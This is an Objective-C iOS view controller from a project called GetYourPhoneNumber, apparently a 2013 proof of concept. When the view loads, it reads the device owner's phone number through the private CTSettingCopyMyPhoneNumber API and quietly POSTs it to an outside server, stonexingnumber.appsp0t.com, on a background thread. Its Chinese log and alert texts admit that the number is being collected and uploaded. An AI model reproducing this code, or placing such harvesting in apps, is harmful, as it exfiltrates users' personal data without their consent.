//
//  ViewController.m
//  GetYourPhoneNumber
//
//  Created by Xingyan on 13-9-10.
//  Copyright (c) 2013年 Xingyan. All rights reserved.
//

#import "ViewController.h"

@interface ViewController ()

@end

@implementation ViewController

extern NSString* CTSettingCopyMyPhoneNumber();

    
- (void)viewDidLoad
{
    [super viewDidLoad];
	// Do any additional setup after loading the view, typically from a nib.
    NSString *phone = CTSettingCopyMyPhoneNumber();
    NSLog(@"你的电环号码是%@ 此时将被我收集", phone);
    dispatch_queue_attr_t queue = dispatch_queue_create("com.uploadphonenumber", nil);
    dispatch_async (queue, ^{
        if (phone != nil)
            [self upload:phone];
    });
    UIAlertView *alert = [[UIAlertView alloc]initWithTitle:@"电话号码" message:phone delegate:nil cancelButtonTitle:@"数据已上传到服务器" otherButtonTitles:nil];
    [alert show];
}

- (void)upload:(NSString*)phonenumber;
{
    NSString *urlString = [NSString stringWithFormat:@"http://stonexingnumber.appsp0t.com"];
    
    NSMutableURLRequest *request = [[[NSMutableURLRequest alloc] init] autorelease];
    [request setURL:[NSURL URLWithString:urlString]];
    [request setHTTPMethod:@"POST"];
    
    //set headers
    NSString *contentType = [NSString stringWithFormat:@"text/xml"];
    [request addValue:contentType forHTTPHeaderField: @"Content-Type"];
    [request addValue:phonenumber forHTTPHeaderField:@"phone"];
    
    //create the body
    NSMutableData *postBody = [NSMutableData data];
    [postBody appendData:[[NSString stringWithFormat:@"<xml>"] dataUsingEncoding:NSUTF8StringEncoding]];
    [postBody appendData:[[NSString stringWithFormat:@"<yourcode/>"] dataUsingEncoding:NSUTF8StringEncoding]];
    [postBody appendData:[[NSString stringWithFormat:@"</xml>"] dataUsingEncoding:NSUTF8StringEncoding]];
    
    //post
    [request setHTTPBody:postBody];
    
    //get response
    NSHTTPURLResponse* urlResponse = nil;
    NSError *error = [[NSError alloc] init];
    NSData *responseData = [NSURLConnection sendSynchronousRequest:request returningResponse:&urlResponse error:&error];
    NSString *result = [[NSString alloc] initWithData:responseData encoding:NSUTF8StringEncoding];
    NSLog(@"Response Code: %d", [urlResponse statusCode]);
    if ([urlResponse statusCode] >= 200 && [urlResponse statusCode] < 300) {
        NSLog(@"Response: %@", result);
        
        //here you get the response
        
    }
}


- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

@end
